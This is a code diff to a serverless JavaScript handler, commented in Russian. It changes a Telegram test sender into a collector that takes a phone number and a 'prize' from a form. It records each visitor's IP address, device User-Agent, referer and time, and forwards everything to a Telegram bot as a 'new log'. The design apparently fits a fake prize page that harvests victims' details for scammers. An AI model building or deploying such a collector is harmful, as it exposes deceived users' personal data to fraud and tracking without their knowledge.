@@ -1,28 +1,53 @@
 export default async function handler(req, res) {
-  const BOT_TOKEN = process.env.BOT_TOKEN;
-  const CHAT_ID = process.env.CHAT_ID;
-
-  if (!BOT_TOKEN || !CHAT_ID) {
-    return res.status(500).json({ error: "BOT_TOKEN или CHAT_ID не заданы" });
+  if (req.method !== "POST") {
+    return res.status(405).json({ error: "Method not allowed" });
   }
 
   try {
-    const { message } = req.body || {};
+    const { phone, prize } = req.body;
 
-    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message || "Тестовое сообщение от Vercel"
-      }),
-    });
+    // Время (по UTC, можно потом сдвинуть под свой часовой пояс)
+    const now = new Date();
+    const time = now.toLocaleString("ru-RU", { timeZone: "Asia/Almaty" });
 
-    const data = await tgRes.json();
-    return res.status(200).json(data);
+    // IP (из заголовка)
+    const ip =
+      req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
+
+    // User-Agent (браузер/устройство)
+    const ua = req.headers["user-agent"] || "неизвестно";
+
+    // Referer (откуда пришёл человек)
+    const referer = req.headers["referer"] || "прямой заход";
+
+    // Сообщение для Telegram
+    const text = `
+✅ Новый лог
+📞 Номер: ${phone}
+🎁 Приз: ${prize}
+⏰ Время: ${time}
+🌍 IP: ${ip}
+🖥️ Устройство: ${ua}
+🔗 Источник: ${referer}
+    `;
+
+    // Отправка в Telegram
+    await fetch(
+      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: process.env.CHAT_ID,
+          text,
+          parse_mode: "HTML",
+        }),
+      }
+    );
+
+    return res.status(200).json({ ok: true });
   } catch (err) {
-    console.error("Ошибка при запросе в Telegram:", err);
-    return res.status(500).json({ error: "Не удалось отправить" });
+    console.error("Ошибка в логах:", err);
+    return res.status(500).json({ error: "Internal Server Error" });
   }
 }
-
